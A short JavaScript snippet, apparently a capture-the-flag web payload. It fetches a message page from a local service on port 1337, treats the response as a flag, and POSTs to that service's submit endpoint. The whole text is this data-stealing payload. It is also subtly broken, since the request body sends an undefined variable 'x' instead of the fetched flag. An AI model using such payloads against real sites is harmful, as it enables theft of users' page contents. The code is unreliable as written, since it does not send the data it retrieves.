fetch("http://127.0.0.1:1337/message/3").then(response => {
	return response.text()
}).then(flag => {
	fetch("http://127.0.0.1:1337/submit", {
		"method": "POST",
		"headers": {
            "Content-Type": "application/json"
        },
        "body": x,
        "mode": "cors",
        "credentials": "omit"
	})
})
